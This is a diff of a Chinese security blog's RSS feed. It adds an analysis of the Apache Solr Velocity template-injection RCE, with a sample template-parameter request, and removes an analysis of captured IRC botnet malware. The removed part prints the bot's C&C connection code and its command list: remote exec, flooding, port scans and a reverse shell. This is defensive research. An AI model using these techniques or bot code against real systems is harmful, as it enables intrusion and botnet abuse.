@@ -7,8 +7,182 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>zh_cn</language>
     <copyright>Copyright © 2019 kylinking</copyright>
-    <lastBuildDate>Wed, 07 Aug 2019 10:38:17 +0000</lastBuildDate>
+    <lastBuildDate>Tue, 05 Nov 2019 09:40:22 +0000</lastBuildDate>
     <atom:link href="https://kylingit.com/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Apache Solr Velocity模板注入漏洞分析</title>
+      <link>https://kylingit.com/blog/apache-solr-velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
+      <pubDate>Tue, 05 Nov 2019 09:40:22 +0000</pubDate>
+      
+      <guid>https://kylingit.com/blog/apache-solr-velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
+      <description>
+
+&lt;script src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/pangu.js&#34;&gt;&lt;/script&gt;
+
+&lt;h3 id=&#34;0x01-概述&#34;&gt;0x01 概述&lt;/h3&gt;
+
+&lt;p&gt;10月30日，研究员S00pY在GitHub发布了Apache Solr Velocity模版注入远程命令执行的poc，该漏洞通过设置资源加载属性，利用&lt;code&gt;VelocityResponseWriter&lt;/code&gt;插件执行自定义模板，进而进行远程代码执行，危害较大，下面是分析过程。&lt;/p&gt;
+
+&lt;h3 id=&#34;0x02-环境搭建&#34;&gt;0x02 环境搭建&lt;/h3&gt;
+
+&lt;p&gt;选择Solr 8.2.0二进制版本进行分析和复现&lt;/p&gt;
+
+&lt;p&gt;下载地址：&lt;a href=&#34;https://archive.apache.org/dist/lucene/solr/8.2.0/&#34;&gt;https://archive.apache.org/dist/lucene/solr/8.2.0/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;调试命令&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;$ cd solr-8.2.0\server
+$ java &amp;quot;-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=9000&amp;quot; -Dsolr.solr.home=&amp;quot;../example/example-DIH/solr/&amp;quot; -jar start.jar --module=http
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;IDEA新建远程调试即可&lt;/p&gt;
+
+&lt;h3 id=&#34;0x03-前置概念&#34;&gt;0x03 前置概念&lt;/h3&gt;
+
+&lt;p&gt;&lt;code&gt;VelocityResponseWriter&lt;/code&gt;(Velocity响应编写器)是 contrib/velocity 目录中可用的可选插件。当使用诸如 “_default”、“techproducts” 和 “example / files” 等配置时，它为浏览用户界面提供动力。&lt;/p&gt;
+
+&lt;p&gt;必须添加它的 JAR 和依赖项（通过&lt;lib&gt;或 solr/home lib 包含），并且必须在 solrconfig.xml 注册，默认已经注册&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572507926900.png&#34; alt=&#34;1572507926900&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;其中有一个属性&lt;code&gt;params.resource.loader.enabled&lt;/code&gt;，默认是&lt;code&gt;false&lt;/code&gt;，需要手动开启&lt;/p&gt;
+
+&lt;p&gt;该参数表示允许加载程序在 Solr 请求参数中指定模板，例如：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;http://localhost:8983/solr/gettingstarted/select?q=\*:*&amp;amp;wt=velocity&amp;amp;v.template=xxx&amp;amp;v.template.xxx=CUSTOM%3A%20%23core_name
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code&gt;v.template=xxx&lt;/code&gt;表示创建一个名为“xxx”的模板，&lt;code&gt;v.template.xxx&lt;/code&gt;则是模板内容&lt;/p&gt;
+
+&lt;p&gt;当这个属性设置为&lt;code&gt;true&lt;/code&gt;时用户就可以传入任意模板内容进行模板注入，从而执行任意命令&lt;/p&gt;
+
+&lt;h3 id=&#34;0x04-漏洞分析&#34;&gt;0x04 漏洞分析&lt;/h3&gt;
+
+&lt;h4 id=&#34;设置-params-resource-loader-enabled-属性&#34;&gt;设置&lt;code&gt;params.resource.loader.enabled&lt;/code&gt;属性&lt;/h4&gt;
+
+&lt;p&gt;在Solr的Web.xml文件中能看到所有的请求都交给&lt;code&gt;org.apache.solr.servlet.SolrDispatchFilter&lt;/code&gt;来处理&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572508606062.png&#34; alt=&#34;1572508606062&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;具体的则是其中的&lt;code&gt;doFilter()&lt;/code&gt;方法。在对路由经过初步处理后，进行两个关键操作：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;HttpSolrCall call = this.getHttpSolrCall(request, response, retry);
+//...
+SolrDispatchFilter.Action result = call.call();
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;初始化一个&lt;code&gt;HttpSolrCall&lt;/code&gt;对象后调用它的&lt;code&gt;call()&lt;/code&gt;方法，在&lt;code&gt;call()&lt;/code&gt;方法中会对路由中具体的组件初始化出对应的handler，再由这个handler去调用这个组件的各个方法&lt;/p&gt;
+
+&lt;p&gt;在Solr 8.2.0中具体的路由有37个，每一类都有对应的handler，都在&lt;code&gt;org.apache.solr.handler&lt;/code&gt;中定义，例如&lt;code&gt;solr/solr/get&lt;/code&gt;对应的hendler为&lt;code&gt;RealTimeGetHandler&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572515458181.png&#34; alt=&#34;1572515458181&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572516210537.png&#34; alt=&#34;1572516210537&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;而&lt;code&gt;/solr/solr/config&lt;/code&gt; 由&lt;code&gt;SolrConfigHandler&lt;/code&gt;来分别处理GET和POST请求&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;SolrConfigHandler.Command command = new SolrConfigHandler.Command(req, rsp, httpMethod);
+if (&amp;quot;POST&amp;quot;.equals(httpMethod)) {
+    if (configEditing_disabled || this.isImmutableConfigSet) {
+        String reason = configEditing_disabled ? &amp;quot;due to disable.configEdit&amp;quot; : &amp;quot;because ConfigSet is immutable&amp;quot;;
+        throw new SolrException(ErrorCode.FORBIDDEN, &amp;quot; solrconfig editing is not enabled &amp;quot; + reason);
+    }
+
+    try {
+        command.handlePOST();
+    } finally {
+        RequestHandlerUtils.addExperimentalFormatWarning(rsp);
+    }
+} else {
+    command.handleGET();
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;私有类&lt;code&gt;Command&lt;/code&gt;会对当前路由的webapp和path做一个切分，对于POST请求，分别会通过&lt;code&gt;SolrConfigHandler.Command#handlePOST()&lt;/code&gt;方法来处理&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572509660264.png&#34; alt=&#34;1572509660264&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;接着调用&lt;code&gt;SolrConfigHandler.Command#handleCommands()&lt;/code&gt;，Solr中&lt;code&gt;Config API&lt;/code&gt;对应的实现都是由这个方法来完成的，如&lt;code&gt;set-property&lt;/code&gt;、&lt;code&gt;unset-property&lt;/code&gt;等&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572516461804.png&#34; alt=&#34;1572516461804&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;此处主要关注更新配置的参数&lt;/p&gt;
+
+&lt;p&gt;从&lt;a href=&#34;https://lucene.apache.org/solr/guide/8_2/config-api.html#basic-commands-for-components&#34;&gt;文档&lt;/a&gt;可以了解对于&lt;code&gt;responsewriter&lt;/code&gt;的操作有下面三个&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;add-queryresponsewriter&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;update-queryresponsewriter&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;delete-queryresponsewriter&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572516621585.png&#34; alt=&#34;1572516621585&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;代码中也能看到对操作名称按&lt;code&gt;-&lt;/code&gt;进行分割提取出对应操作，然后由&lt;code&gt;updateNamedPlugin()&lt;/code&gt;方法来完成配置文件的创建/覆盖操作，具体跟入看一下&lt;/p&gt;
+
+&lt;p&gt;在&lt;code&gt;updateNamedPlugin()&lt;/code&gt;中有个&lt;code&gt;verifyClass&lt;/code&gt;的调用，当传入参数没有设置&lt;code&gt;runtimeLib&lt;/code&gt;时会去创建class字段指定的类，所以当我们传入&lt;code&gt;VelocityResponseWriter&lt;/code&gt;时，会在其初始化的时候写入对应的参数&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572518046827.png&#34; alt=&#34;1572518046827&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;然后返回到&lt;code&gt;handleCommands()&lt;/code&gt;中把配置写入到&lt;code&gt;configoverlay.json&lt;/code&gt;文件&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572518122216.png&#34; alt=&#34;1572518122216&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;因此，通过&lt;code&gt;config api&lt;/code&gt;可以重新设置&lt;code&gt;VelocityResponseWriter&lt;/code&gt;的属性，为下一步加载模板提供入口&lt;/p&gt;
+
+&lt;p&gt;三种命令的区别如下：&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;add- 命令都会将新配置添加到configoverlay.json，这将覆盖solrconfig.xml组件中的任何其他设置；
+update- 命令覆盖configoverlay.json中的现有设置；
+delete-命令从configoverlay.json中删除设置&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&#34;注入自定义模板&#34;&gt;注入自定义模板&lt;/h4&gt;
+
+&lt;p&gt;在&lt;code&gt;SolrDispatchFilter&lt;/code&gt;中有有一个枚举类&lt;code&gt;Action&lt;/code&gt;，定义了每个handler的所属的操作，通过ConfigAPI更新配置时，当前的action是&lt;code&gt;PROCESS&lt;/code&gt;，因此会进入&lt;code&gt;HttpSolrCall.call()&lt;/code&gt;的&lt;code&gt;PROCESS&lt;/code&gt;分支&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572576900618.png&#34; alt=&#34;1572576900618&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;之后通过&lt;code&gt;QueryResponseWriterUtil.writeQueryResponse()&lt;/code&gt;进入&lt;code&gt;VelocityResponseWriter.write&lt;/code&gt;，在这个方法中完成&lt;code&gt;Velocity&lt;/code&gt;的解析&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572577848829.png&#34; alt=&#34;1572577848829&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;首先会初始化一个解析模板的引擎&lt;code&gt;VelocityEngine&lt;/code&gt;，在创建引擎的过程中会检查是否允许参数资源加载，这也就是第一个请求设置的&lt;code&gt;params.resource.loader.enabled&lt;/code&gt;属性值。由于&lt;code&gt;solr.resource.loader.enabled&lt;/code&gt;默认是开启的，所以此处只需要设置params的值&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572577993537.png&#34; alt=&#34;1572577993537&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;之后通过&lt;code&gt;Template.getTemplate()&lt;/code&gt;设置自定义模板，然后进入&lt;code&gt;Template.merge()&lt;/code&gt;进入AST解析，在解析过程中会调用到&lt;code&gt;ASTMethod.execute()&lt;/code&gt;方法，这个流程与之前披露的CVE-2019-11581 JIRA模板注入漏洞是一样的，不再赘述，详细可以参考&lt;a href=&#34;https://kylingit.com/blog/cve-2019-11581-atlassian-jira%E6%9C%AA%E6%8E%88%E6%9D%83%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&#34;&gt;CVE-2019-11581 ATLASSIAN JIRA 未授权模板注入漏洞分析&lt;/a&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;回过头看一下&lt;code&gt;Velocity&lt;/code&gt;渲染的大致流程：&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;Velocity 渲染引擎首先磁盘加载模板文件到内存，然后解析模板模板文件为 AST 结构，并对 AST 中每个节点进行初始化，第二次加载同一个模板文件时候如果开启了缓存则直接返回模板资源，通过使用资源缓存节省了从磁盘加载并重新解析为 AST 的开销。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;而&lt;code&gt;ASTMethod.execute()&lt;/code&gt;方法设计之初是在&lt;code&gt;Velocity parse&lt;/code&gt;解析模板的过程中，通过反射调用相关方法完成正常模板渲染动作，例如获取背景颜色、获取 text 内容、获取页面编码等，但当此处攻击者传入精心构造的数据后，利用反射执行了&lt;code&gt;java.lang.Runtime.getRuntime&lt;/code&gt;，成功达到命令执行的目的&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;调用栈&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572575433979.png&#34; alt=&#34;1572575433979&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;PoC&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1572578779708.png&#34; alt=&#34;1572578779708&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;参考&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://lucene.apache.org/solr/guide/8_2/config-api.html#basic-commands-for-components&#34;&gt;https://lucene.apache.org/solr/guide/8_2/config-api.html#basic-commands-for-components&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/veracode-research/solr-injection#7-cve-2019-xxxx-rce-via-velocity-template-by-_s00py&#34;&gt;https://github.com/veracode-research/solr-injection#7-cve-2019-xxxx-rce-via-velocity-template-by-_s00py&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;script&gt;pangu.spacingPage();&lt;/script&gt;
+</description>
+    </item>
     
     <item>
       <title>CVE-2019-0193 Apache Solr远程命令执行漏洞分析</title>
@@ -3197,394 +3371,6 @@ SESSION_DATA = HEX_DATA.decode(&#39;hex&#39;)
 &lt;p&gt;&lt;a href=&#34;https://security.szurek.pl/gitea-1-4-0-unauthenticated-rce.html&#34;&gt;https://security.szurek.pl/gitea-1-4-0-unauthenticated-rce.html&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;&lt;a href=&#34;https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html&#34;&gt;https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html&lt;/a&gt;&lt;/p&gt;
-
-&lt;script&gt;pangu.spacingPage();&lt;/script&gt;
-</description>
-    </item>
-    
-    <item>
-      <title>两款IRC Bot的分析</title>
-      <link>https://kylingit.com/blog/%E4%B8%A4%E6%AC%BEirc-bot%E7%9A%84%E5%88%86%E6%9E%90/</link>
-      <pubDate>Wed, 06 Jun 2018 10:01:49 +0000</pubDate>
-      
-      <guid>https://kylingit.com/blog/%E4%B8%A4%E6%AC%BEirc-bot%E7%9A%84%E5%88%86%E6%9E%90/</guid>
-      <description>
-
-&lt;script src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/pangu.js&#34;&gt;&lt;/script&gt;
-
-&lt;p&gt;近期在蜜罐上捕获到两个利用RCE漏洞传播的远控木马，经过分析判断是基于IRC协议的bot样本，分别是使用php编写的&lt;code&gt;Pbot&lt;/code&gt;和使用Perl版的&lt;code&gt;Perl IrcBot&lt;/code&gt;，下面简单分析一下这两个脚本。&lt;/p&gt;
-
-&lt;h2 id=&#34;0x01-irc协议简介&#34;&gt;0x01 IRC协议简介&lt;/h2&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;IRC是Internet Relay Chat 的英文缩写，中文一般称为互联网中继聊天。它是由芬兰人Jarkko Oikarinen于1988年首创的一种网络聊天协议。经过十年的发展，目前世界上有超过60个国家提供了IRC的服务。IRC的工作原理非常简单，您只要在自己的PC上运行客户端软件，然后通过因特网以IRC协议连接到一台IRC服务器上即可。它的特点是速度非常之快，聊天时几乎没有延迟的现象，并且只占用很小的带宽资源。所有用户可以在一个被称为Channel（频道）的地方就某一话题进行交谈或密谈。每个IRC的使用者都有一个Nickname（昵称）。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;基础IRC指令如下表，更详细的可以参考&lt;a href=&#34;https://github.com/sulit/docs/blob/master/src/irc/irc.md&#34;&gt;这里&lt;/a&gt;&lt;/p&gt;
-
-&lt;table&gt;
-&lt;thead&gt;
-&lt;tr&gt;
-&lt;th&gt;指令&lt;/th&gt;
-&lt;th&gt;注释&lt;/th&gt;
-&lt;/tr&gt;
-&lt;/thead&gt;
-
-&lt;tbody&gt;
-&lt;tr&gt;
-&lt;td&gt;/join #&lt;channel&gt;&lt;/td&gt;
-&lt;td&gt;加入名为channel的频道。所有频道名均以&amp;rsquo;#&amp;lsquo;开头。&lt;/td&gt;
-&lt;/tr&gt;
-
-&lt;tr&gt;
-&lt;td&gt;/part #&lt;channel&gt;&lt;/td&gt;
-&lt;td&gt;离开名为channel的频道。&lt;/td&gt;
-&lt;/tr&gt;
-
-&lt;tr&gt;
-&lt;td&gt;/nick &lt;NewNick&gt;&lt;/td&gt;
-&lt;td&gt;将你当前的昵称改为NewNick。&lt;/td&gt;
-&lt;/tr&gt;
-
-&lt;tr&gt;
-&lt;td&gt;/me &lt;action&gt;&lt;/td&gt;
-&lt;td&gt;在当前频道显示某个动作（举个例子，/me waves会显示&amp;rdquo;*JohnSmith waves&amp;rdquo;。）&lt;/td&gt;
-&lt;/tr&gt;
-
-&lt;tr&gt;
-&lt;td&gt;/away &lt;Message&gt;&lt;/td&gt;
-&lt;td&gt;将你的状态标记为&amp;rdquo;Away&amp;rdquo;（离开），并向任何给你发消息的人发送内容为Message的信息。&lt;/td&gt;
-&lt;/tr&gt;
-
-&lt;tr&gt;
-&lt;td&gt;/msg &lt;nick&gt;&lt;message&gt;&lt;/td&gt;
-&lt;td&gt;向名为nick的用户发送内容为message的私信。&lt;/td&gt;
-&lt;/tr&gt;
-
-&lt;tr&gt;
-&lt;td&gt;/quit&lt;/td&gt;
-&lt;td&gt;终止IRC连接。&lt;/td&gt;
-&lt;/tr&gt;
-&lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;p&gt;在这两个bot中用到的比较关键的是&lt;code&gt;PRIVMSG &lt;/code&gt;指令，指的是Private Message（私密消息），它的基本格式类似这样：&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;:Nick!user@host PRIVMSG destination :Message&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;黑客利用IRC协议与被控主机通信，C&amp;amp;C发送的指令就是这种格式，bot根据PRIVMSG后的Message进行相应操作，大致过程如下图所示&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/Snipaste_20180605_111020.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&#34;环境准备&#34;&gt;环境准备&lt;/h3&gt;
-
-&lt;p&gt;我们在本地Ubuntu系统搭建一个IRC服务器，用来模拟样本与C&amp;amp;C的通信。&lt;/p&gt;
-
-&lt;p&gt;1.搭建IRC服务器&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;apt-get install inspircd&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;修改配置文件&lt;code&gt;vim /etc/inspircd/inspircd.conf&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;修改&lt;code&gt;bind address&lt;/code&gt;监听在&lt;code&gt;0.0.0.0&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;启动服务&lt;code&gt;service inspircd start&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;2.使用mIRC软件模拟通信&lt;/p&gt;
-
-&lt;p&gt;在Windows下面可以使用mIRC软件进行irc通信，&lt;a href=&#34;https://www.mirc.com/get.html&#34;&gt;下载地址&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;创建一个IRC Servers &lt;code&gt;irc.local&lt;/code&gt;，地址为&lt;code&gt;192.168.3.195&lt;/code&gt;，密码可以为空&lt;/p&gt;
-
-&lt;p&gt;连接上本地IRC服务器后我们创建一个channel，叫做&lt;code&gt;#php&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1528252223926.png&#34; alt=&#34;1528252223926&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;这样就加入了&lt;code&gt;#php&lt;/code&gt;channel&lt;/p&gt;
-
-&lt;h2 id=&#34;0x02-pbot&#34;&gt;0x02 Pbot&lt;/h2&gt;
-
-&lt;p&gt;Pbot是使用php编写的IrcBot&lt;/p&gt;
-
-&lt;h3 id=&#34;连接配置&#34;&gt;连接配置&lt;/h3&gt;
-
-&lt;p&gt;我们修改bot的连接配置，其中&lt;code&gt;hostauth&lt;/code&gt;是受信任的控制端，黑客会设置为自己的ip，我们将之设置为&lt;code&gt;*&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;$cfg = array(
-    &amp;quot;server&amp;quot; =&amp;gt; &amp;quot;192.168.3.195&amp;quot;,	//irc服务器地址
-    &amp;quot;port&amp;quot; =&amp;gt; &amp;quot;6667&amp;quot;,
-    &amp;quot;key&amp;quot; =&amp;gt; &amp;quot;&amp;quot;,
-    &amp;quot;prefix&amp;quot; =&amp;gt; &amp;quot;&amp;quot;,
-    &amp;quot;maxrand&amp;quot; =&amp;gt; &amp;quot;8&amp;quot;,
-    &amp;quot;chan&amp;quot; =&amp;gt; &amp;quot;#php&amp;quot;,				//加入的频道
-    &amp;quot;trigger&amp;quot; =&amp;gt; &amp;quot;.&amp;quot;,				//指令分隔符
-    &amp;quot;hostauth&amp;quot; =&amp;gt; &amp;quot;*&amp;quot;				//受信任的远程主机，修改为*
-);
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;然后可以增加一行语句来输出当前的connection状态，方便查看&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;echo fgets($this-&amp;gt;conn, 512);&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;初始化阶段bot先设置好一些信息，例如服务器ip、端口等&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;public function start($cfg)
-{
-    $this-&amp;gt;config = $cfg;
-    while (true) {
-        if (!($this-&amp;gt;conn = fsockopen($this-&amp;gt;config[&#39;server&#39;], $this-&amp;gt;config[&#39;port&#39;], $e, $s, 30)))
-            $this-&amp;gt;start($cfg);
-        $ident = $this-&amp;gt;config[&#39;prefix&#39;];
-        $alph = range(&amp;quot;0&amp;quot;, &amp;quot;9&amp;quot;);
-        for ($i = 0; $i &amp;lt; $this-&amp;gt;config[&#39;maxrand&#39;]; $i++)
-            $ident .= $alph[rand(0, 9)];
-        $this-&amp;gt;send(&amp;quot;USER &amp;quot; . $ident . &amp;quot; 127.0.0.1 localhost :&amp;quot; . php_uname() . &amp;quot;&amp;quot;);
-        $this-&amp;gt;set_nick();
-        $this-&amp;gt;main();
-    }
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;随后bot会设置一个随机名称加入相应的channel&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1528252610192.png&#34; alt=&#34;1528252610192&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;在IRC聊天室也能看到bot上线&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1528252650212.png&#34; alt=&#34;1528252650212&#34; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&#34;功能分析&#34;&gt;功能分析&lt;/h3&gt;
-
-&lt;p&gt;当连接建立后，bot会持续监听socket信息，然后根据C&amp;amp;C发送的指令进行响应&lt;/p&gt;
-
-&lt;p&gt;支持的指令有如下几种&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;.user &lt;password&gt;&lt;/strong&gt; 用于登录bot，以便它接受其他命令。密码即为初始配置的密码，只有登录成功后才能进行后续指令下发操作&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;.logout&lt;/strong&gt; 注销bot&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;.die&lt;/strong&gt; 关闭与IRC服务器的连接&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;.restart&lt;/strong&gt; 重启bot&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;.mail &lt;to&gt; &lt;from&gt; &lt;subject&gt; &lt;msg&gt;&lt;/strong&gt;  发送邮件，调用php的&lt;code&gt;mail()&lt;/code&gt;函数，可以用来发送垃圾邮件&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;.dns &lt;domain&gt;&lt;/strong&gt;进行DNS查询&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;.download &lt;URL&gt; &lt;filename&gt;&lt;/strong&gt; 下载文件&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;.exec &lt;command&gt;&lt;/strong&gt; 使用&lt;code&gt;exec()&lt;/code&gt;函数执行命令&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;.cmd &lt;command&gt;&lt;/strong&gt; 使用&lt;code&gt;popen()&lt;/code&gt;函数执行命令&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;.info&lt;/strong&gt; 获取系统信息&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;.php &lt;php code&gt;&lt;/strong&gt;  使用&lt;code&gt;eval()&lt;/code&gt;函数执行php代码&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;.tcpflood &lt;target&gt; &lt;packets&gt; &lt;packetsize&gt; &lt;port&gt; &lt;delay&gt;&lt;/strong&gt; TCP Flood攻击&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;.udpflood &lt;target&gt; &lt;packets&gt; &lt;packetsize&gt; &lt;delay&gt;&lt;/strong&gt; UDP Flood洪水攻击&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;.raw &lt;cmd&gt;&lt;/strong&gt; 原始IRC命令&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;.rndnick&lt;/strong&gt; 更改bot昵称&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;.pscan &lt;host&gt; &lt;port&gt;&lt;/strong&gt; 端口扫描&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;.safe&lt;/strong&gt; 测试&lt;code&gt;safe_mode&lt;/code&gt;是否开启&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;.inbox &lt;to&gt;&lt;/strong&gt; 测试收件箱&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;.conback &lt;ip&gt; &lt;port&gt;&lt;/strong&gt; 创建一个perl脚本并执行，可以反弹shell。&lt;/p&gt;
-
-&lt;p&gt;我们分析一下其中的几个指令&lt;/p&gt;
-
-&lt;p&gt;控制端在聊天室发送消息，指令需要以&lt;code&gt;.&lt;/code&gt;开头，因为下面会根据分隔符&lt;code&gt;.&lt;/code&gt;来取出实际命令&lt;/p&gt;
-
-&lt;p&gt;实际传输的指令是这样的格式&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;:test!test@192.168.3.193 PRIVMSG #php :.command&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;bot会根据PRIVMSG后面的&lt;code&gt;.command&lt;/code&gt;进入相应的分支&lt;/p&gt;
-
-&lt;h4 id=&#34;uname&#34;&gt;uname&lt;/h4&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1528254954215.png&#34; alt=&#34;1528254954215&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1528254899287.png&#34; alt=&#34;1528254899287&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;在进入对应指令的分支之前先判断当前连接的irc服务器是否在&lt;code&gt;hostauth&lt;/code&gt;列表，这决定了bot是否接受控制&lt;/p&gt;
-
-&lt;p&gt;再一个就是以&lt;code&gt;.&lt;/code&gt;来作为指令的起始符，这里应该取配置中的&lt;code&gt;trigger&lt;/code&gt;变量，但是此处被硬编码为&lt;code&gt;.&lt;/code&gt;&lt;/p&gt;
-
